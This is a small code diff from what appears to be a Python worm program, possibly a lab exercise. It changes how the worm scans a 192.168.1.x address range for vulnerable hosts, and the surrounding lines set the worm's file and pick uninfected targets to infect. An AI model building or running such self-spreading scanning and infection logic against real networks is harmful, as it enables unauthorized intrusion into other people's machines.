@@ -16,7 +16,7 @@ def main():
     worm.set_worm_file(sys.argv[0])
 
     """ Set default vulnerable hosts to scan """
-    worm.retrieve_vulnerable_hosts("192.168.1.0/24")
+    worm.retrieve_vulnerable_hosts("192.168.1.", 10)
 
     """ Find a target to infect, checks to make sure target hasn't previously
         been infected """
